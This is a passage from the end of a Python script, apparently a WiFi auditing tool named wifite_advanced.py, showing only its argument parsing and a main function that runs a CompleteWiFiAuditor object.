  python3 wifite_advanced.py -v           # Verbose output
        '''
    )
    
    parser.add_argument('-i', '--interface', help='WiFi interface')
    parser.add_argument('-v', '--verbose', action='store_true')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    auditor = CompleteWiFiAuditor(args.interface)
    auditor.run()


if __name__ == '__main__':
    main()
